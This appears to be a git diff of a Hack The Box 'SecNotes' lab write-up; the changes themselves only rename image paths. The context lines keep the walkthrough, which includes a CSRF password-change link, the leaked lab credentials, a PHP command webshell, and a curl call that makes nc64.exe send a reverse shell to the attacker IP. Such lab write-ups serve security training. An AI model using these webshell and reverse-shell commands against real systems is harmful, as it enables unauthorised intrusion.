@@ -4,7 +4,7 @@ icon: windows
 
 # SecNotes - Medium
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/secnotes"><strong>SecNotes</strong></a></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/secnotes"><strong>SecNotes</strong></a></p></figcaption></figure>
 
 ## <mark style="color:blue;">Gaining Access</mark>
 
@@ -68,43 +68,43 @@ HOP RTT      ADDRESS
 
 ### <mark style="color:$primary;">HTTP Port 8808 TCP</mark>
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is a default Microsoft IIS page! Nothing else here so i will move on
 
 ### <mark style="color:$primary;">HTTP Port 80 TCP</mark>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Visiting the site we are redirected to `/login.php` , let's register an account and login!
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 After logging you will be redirected to `/home.php`
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The first comment stands out immediately, it seems people were storing PII \[Personal Identifiable Information] in there notes we also see the admin's account `tyler@secnotes.htb`
 
 ### <mark style="color:$primary;">Change Password FORM</mark>
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p><strong>Change Password Button redirect</strong></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption><p><strong>Change Password Button redirect</strong></p></figcaption></figure>
 
 This form does not request the current password before changing it. After submitting the new password to `/change_pass.php` we are redirected to `/home.php` with a message saying that the password was changed.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Capturing the request in Burp Suite I was able to modify the request from **POST** to **GET** and it still worked&#x20;
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:$primary;">Contact Us FORM</mark>
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I tried including a link in the message to see if it gets clicked and to my surprised it was!
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:$primary;">CSRF || XSRF</mark>
 
@@ -129,19 +129,19 @@ http://10.10.10.97/change_pass.php?password=password123&confirm_password=passwor
 http://10.10.16.2/complete
 ```
 
-<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 After sending wait for a bit and you should see a hit on your nc listener.
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once you see the hit, try logging in as **tyler:password123**
 
-<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Clicking on the 3rd note we discover some Credentials
 
-<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 tyler / 92g!mA8BGjOirkL%OG*&
@@ -151,7 +151,7 @@ tyler / 92g!mA8BGjOirkL%OG*&
 netexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tyler has read & write access on the new site!
 
@@ -161,7 +161,7 @@ smbclient \\\\10.10.10.97\\new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 Connecting to the share we find the root directory of the default IIS site we discovered on port 8808!&#x20;
 
@@ -169,9 +169,9 @@ Connecting to the share we find the root directory of the default IIS site we di
 
 To run commands, I’ll download [this aspx webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) from GitHub and upload it over SMB
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 I cannot seem to get aspx code to run and I saw that there is a scheduler running in the background that is cleaning the share every 2, 3 minutes.
 
@@ -185,7 +185,7 @@ echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
 
 Now place `cmd.php` and `nc64.exe` into the smb share
 
-<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now make sure you have a listener ready on your designated port then run the following command
 
@@ -195,7 +195,7 @@ curl "http://10.10.10.97:8808/cmd.php?cmd=nc64.exe+-e+cmd.exe+10.10.16.2+8808"
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 We managed to get a shell as tyler!
 
@@ -205,9 +205,9 @@ We managed to get a shell as tyler!
 
 Inside tyler's Desktop Directory there is a shortcut to <mark style="color:$primary;">**bash**</mark>&#x20;
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 the shrtcut reveals the path to bash.exe and running gives us a root shell in the Ubuntu sandbox
 
@@ -215,7 +215,7 @@ the shrtcut reveals the path to bash.exe and running gives us a root shell in th
 C:\Windows\System32\bash.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 Improve shell using
 
@@ -225,8 +225,8 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 running the history command I come across the administrator's credentials
 
-<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's test them and try to get a shell as administrator
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
